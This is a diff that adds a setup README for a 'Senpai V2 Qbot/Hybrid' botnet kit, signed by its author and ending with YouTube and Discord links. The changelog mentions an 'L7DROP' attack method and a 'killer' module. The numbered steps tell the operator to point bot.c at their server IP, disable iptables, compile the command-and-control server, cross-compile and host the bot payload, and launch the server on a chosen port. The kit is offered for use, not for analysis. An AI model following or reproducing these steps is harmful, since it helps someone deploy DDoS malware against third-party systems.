@@ -1,0 +1,64 @@
+
+ ██████ ▓█████  ███▄    █  ██▓███   ▄▄▄       ██▓
+▒██    ▒ ▓█   ▀  ██ ▀█   █ ▓██░  ██▒▒████▄    ▓██▒
+░ ▓██▄   ▒███   ▓██  ▀█ ██▒▓██░ ██▓▒▒██  ▀█▄  ▒██▒
+  ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ░██░
+▒██████▒▒░▒████▒▒██░   ▓██░▒██▒ ░  ░ ▓█   ▓██▒░██░
+▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒ ▒▓▒░ ░  ░ ▒▒   ▓▒█░░▓  
+░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░░▒ ░       ▒   ▒▒ ░ ▒ ░
+░  ░  ░     ░      ░   ░ ░ ░░         ░   ▒    ▒ ░
+      ░     ░  ░         ░                ░  ░ ░ 
+
+Made By Purcend UwU
+-Added L7DROP
+-GUI Updates
+-Updated Hex Strings
+-Added Killer Dont Touch Thx 
+ Enjoy <333
+
+
+
+
+
+
+Step 1.) 
+change the ip in bot.c on line 44 to your server IP
+
+
+Step 2.)Copy The Paste Command 
+yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+
+
+Step 3.) Install The Commands Please
+yum install httpd
+service httpd restart 
+service iptables stop
+
+
+ 
+Step 4.) Update The CNC Code Loading Etc
+gcc cnc.c -o server -pthread
+
+
+
+Step 5.) Screen The Senpai V2 Qbot/ Hybrid Source 
+python cc9.py bot.c SERVER IP
+
+
+
+Step 6.)
+Copy The Payload On Ur Sever
+
+
+
+Step 7. screen ./server 666 1 PUT UR PORT HERE  
+
+
+After you screened press CTRL + D
+
+
+
+YouTube: https://www.youtube.com/channel/UCmNLDJceYHK285lQukGM3JQ
+Join My Discord: https://discord.gg/nload
+
